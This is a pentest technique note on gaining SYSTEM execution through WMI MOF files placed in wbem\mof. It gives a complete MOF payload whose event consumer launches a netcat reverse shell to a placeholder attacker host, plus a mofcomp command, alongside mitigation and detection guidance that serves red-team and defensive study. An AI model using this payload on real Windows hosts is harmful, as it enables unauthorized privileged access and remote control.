---
topic: WMI — execution through MOF self-install
tags: [windows, wmi, mof, privesc, lateral-movement]
---

# WMI — execution through MOF self-install

[🇪🇸 Español](mof-wmi-self-install.md) | **English**

## Concept

WMI automatically compiles `.mof` files placed in `C:\Windows\System32\wbem\mof\`. A MOF can register an `ActiveScriptEventConsumer` and an event filter; when the event fires, the consumer runs code with WMI service privileges, usually SYSTEM.

## When it applies

- Writing to `wbem\mof` or another path compiled by `mofcomp` is possible.
- TFTP, SMB or another service allows uploads as SYSTEM.
- The host runs WMI and does not monitor new consumers.

## Procedure

1. Upload a reverse shell executable to an accessible path.
2. Create a MOF with a consumer and a filter.
3. Place it in `wbem\mof` or compile it with `mofcomp`.
4. Trigger the event or wait for automatic compilation.

```text
#pragma namespace("\\\\.\\root\\cimv2")
instance of ActiveScriptEventConsumer as $cons {
  Name = "ASEC";
  ScriptingEngine = "JScript";
  ScriptText = "new ActiveXObject('Wscript.Shell').Run('C:\\\\Windows\\\\Temp\\\\n.exe -e cmd.exe <ATTACKER> 443');";
};
instance of __EventFilter as $filt {
  Name = "instfilt";
  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance.__class = 'MyClass'";
};
instance of __FilterToConsumerBinding as $bind { Consumer = $cons; Filter = $filt; };
```

```cmd
mofcomp C:\Windows\Temp\payload.mof
```

## Variants

- `CommandLineEventConsumer` instead of `ActiveScriptEventConsumer`.
- A timer filter with `__TimerEvent` for delayed execution.
- A MOF dropped over SMB into a writable share.

## Limitations

- Requires write access to a compiled path.
- The WMI repository may be damaged or monitored.
- An EDR may block consumer creation.

## Mitigation

- Restrict writes to `System32` and `wbem\mof`.
- Monitor WMI filter and consumer creation.
- Disable anonymous transfer services.

## Detection

- New `.mof` files in `wbem\mof`.
- WMI event 5861 and child processes of `WmiPrvSE.exe`.
- `ActiveScriptEventConsumer` with inline scripts.

## References

- [Microsoft — MOF files and mofcomp](https://learn.microsoft.com/en-us/windows/win32/wmisdk/mof-files)
- [0xdf — Dropzone](https://0xdf.gitlab.io/2018/11/03/htb-dropzone.html)
- [MITRE ATT&CK — T1047 WMI](https://attack.mitre.org/techniques/T1047/)
